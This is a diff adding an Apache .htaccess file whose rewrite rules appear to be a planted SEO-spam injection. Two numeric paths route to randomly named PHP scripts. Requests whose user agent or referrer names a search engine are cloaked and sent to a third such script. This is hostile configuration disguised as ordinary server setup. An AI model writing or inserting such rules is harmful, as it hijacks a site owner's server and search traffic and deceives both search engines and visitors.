@@ -1,0 +1,14 @@
+RewriteEngine on
+RewriteRule ^1494804276/(.*)$ epaulets-junette.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^8614580015/(.*)$ attentionality-dependents.php [QSA,L]
+
+RewriteEngine On
+
+RewriteCond %{ENV:REDIRECT_STATUS} 200
+RewriteRule ^ - [L]
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^(.*)$ cancellations-dining.php?$1 [L]
+
